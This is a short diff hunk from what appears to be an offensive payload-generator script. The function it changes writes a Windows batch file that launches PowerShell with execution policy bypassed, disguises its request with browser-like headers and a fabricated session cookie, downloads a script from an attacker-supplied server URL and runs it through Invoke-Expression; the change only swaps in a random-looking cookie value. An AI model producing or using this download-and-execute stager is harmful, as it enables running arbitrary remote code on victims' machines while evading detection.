@@ -111,7 +111,7 @@ def save_encoded_ps1(ip, port, output_file):
 def generate_bat_with_remote_ps1(server_url, output_file):
     bat_content = f"""
 @echo off
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$wc = New-Object Net.WebClient; $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'); $wc.Headers.Add('Referer','https://www.bing.com'); $wc.Headers.Add('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'); $wc.Headers.Add('Cookie', 'sessionid=abc123'); $wc.DownloadString('{server_url}') | Invoke-Expression"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$wc = New-Object Net.WebClient; $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'); $wc.Headers.Add('Referer','https://www.bing.com'); $wc.Headers.Add('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'); $wc.Headers.Add('Cookie', 'sessionid=bM2Bhj6QixtA4n9GcFB4Ne5o4MiQEmHvKVFB6v0vHPoIIHAvIh'); $wc.DownloadString('{server_url}') | Invoke-Expression"
     """
 
     with open(output_file, 'w') as file:
